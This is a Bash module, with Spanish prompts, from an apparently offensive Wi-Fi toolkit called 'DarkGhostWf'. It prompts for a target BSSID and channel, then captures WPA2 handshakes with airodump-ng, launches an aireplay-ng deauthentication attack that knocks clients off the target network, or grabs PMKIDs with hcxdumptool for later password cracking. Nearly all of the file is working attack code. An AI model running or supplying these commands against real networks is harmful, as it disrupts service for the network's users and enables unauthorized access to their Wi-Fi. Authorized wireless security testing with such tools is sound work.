#!/bin/bash

# --- Module: Capture ---

function start_capture() {
    echo -e "\n${BLUE}[*] Módulo de Captura (Handshake / PMKID)${NC}"
    echo -e "${YELLOW}Interfaz (Modo Monitor): ${NC}"
    read iface
    echo -e "${YELLOW}BSSID del objetivo: ${NC}"
    read bssid
    echo -e "${YELLOW}Canal (Channel): ${NC}"
    read channel
    echo -e "${YELLOW}Nombre para el archivo de salida (ej: target_wifi): ${NC}"
    read output_name
    
    local out_path="$LOGS/$output_name"

    echo -e "\n1) Captura Global (airodump-ng)"
    echo "2) Ataque Deauth (aireplay-ng) + Captura"
    echo "3) Captura PMKID (hcxdumptool - Recomendado para WPA2 sin clientes)"
    read method

    case $method in
        1)
            echo -e "${GREEN}[*] Iniciando captura... Presione Ctrl+C para finalizar.${NC}"
            airodump-ng -c "$channel" --bssid "$bssid" -w "$out_path" "$iface"
            ;;
        2)
            # Lanzamos la captura en segundo plano o en un nuevo proceso y luego el deauth
            echo -e "${YELLOW}[!] Se recomienda tener dos paneles. ¿Quieres automatizar deauth? (s/n)${NC}"
            read deauth_opt
            if [[ "$deauth_opt" == "s" ]]; then
                echo -e "${BLUE}[*] Lanzando Airodump y Aireplay...${NC}"
                # Aquí lo ideal es usar tmux para que el usuario lo vea
                if tmux has-session -t DarkGhostWf 2>/dev/null; then
                    tmux send-keys -t DarkGhostWf:0.1 "airodump-ng -c $channel --bssid $bssid -w $out_path $iface" C-m
                    tmux split-window -v -p 30 -t DarkGhostWf:0.1
                    tmux send-keys -t DarkGhostWf:0.1 "aireplay-ng -0 5 -a $bssid $iface" C-m
                    tmux attach-session -t DarkGhostWf
                else
                    echo -e "${RED}[!] No hay sesión activa de tmux. Iniciando captura normal...${NC}"
                    airodump-ng -c "$channel" --bssid "$bssid" -w "$out_path" "$iface"
                fi
            fi
            ;;
        3)
            echo -e "${BLUE}[*] Usando hcxdumptool para captura pasiva de PMKID/Handshake...${NC}"
            hcxdumptool -i "$iface" -o "${out_path}.pcapng" --enable_status=1
            echo -e "${GREEN}[+] Captura guardada en ${out_path}.pcapng${NC}"
            ;;
        *) return ;;
    esac
}
